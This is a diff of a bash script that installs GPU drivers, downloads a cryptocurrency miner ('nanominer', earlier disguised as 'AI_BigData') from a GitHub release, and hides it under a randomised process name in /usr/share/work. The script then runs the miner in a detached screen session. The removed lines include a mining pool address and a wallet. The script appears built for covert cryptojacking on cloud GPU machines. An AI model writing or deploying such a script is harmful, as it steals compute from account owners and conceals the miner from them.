@@ -1,27 +1,30 @@
 #!/bin/bash
 apt-get update && apt-get install -y docker.io screen
-sudo apt-get install -y build-essential gcc-multilib dkms
-apt-get install -y git wget screen
-sudo dpkg --add-architecture i386
-sudo apt update
-sudo apt install -y libc6:i386
+apt-get install -y git wget
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-apt-get install -y git wget screen
-rm -rf NVIDIA-Linux-x86_64-470.82.01-grid-azure.run
-wget https://download.microsoft.com/download/a/3/c/a3c078a0-e182-4b61-ac9b-ac011dc6ccf4/NVIDIA-Linux-x86_64-470.82.01-grid-azure.run
-sudo chmod +x NVIDIA-Linux-x86_64-470.82.01-grid-azure.run
-sudo ./NVIDIA-Linux-x86_64-470.82.01-grid-azure.run --dkms -s --no-opengl-files
+wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
+sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
+ls /etc/apt/preferences.d/cuda-repository-pin-600
+wget https://developer.download.nvidia.com/compute/cuda/11.2.2/local_installers/cuda-repo-ubuntu1804-11-2-local_11.2.2-460.32.03-1_amd64.deb
+sudo dpkg -i cuda-repo-ubuntu1804-11-2-local_11.2.2-460.32.03-1_amd64.deb
+sudo apt-key add /var/cuda-repo-ubuntu1804-11-2-local/7fa2af80.pub
+rm -f cuda-repo-ubuntu1804-11-2-local_11.2.2-460.32.03-1_amd64.deb
+sudo apt-get update
+sudo apt-get install -y cuda-drivers
 rm -r /usr/share/work/$azure
 mkdir /usr/share
 mkdir /usr/share/work
-wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/AI_BigData
-mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
-mv AI_BigData $azure -n
+rm -r /usr/share/work/platinum
+wget https://github.com/wollfoo/wolethv100/releases/download/bbzz/platinum.tar.gz
+mv platinum.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar xf platinum.tar.gz
+rm -rf platinum.tar.gz && cd platinum
+mv nanominer $azure -n
 cp $azure "$cpuname"
-rm -f  AI_BigData
+rm -f  nanominer
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --user t1SzPN5ZrAccHeSGPcxwzuwL9Qk54GUzEJi.bbzz --ssl --server eu-flux.fluxpools.net --port 7003 --pass wow --algo 125_4 --pers ZelProof
+screen -d -m ./"${cpuname}"
 
 #!/bin/bash
 docker rm -f cpudataissa
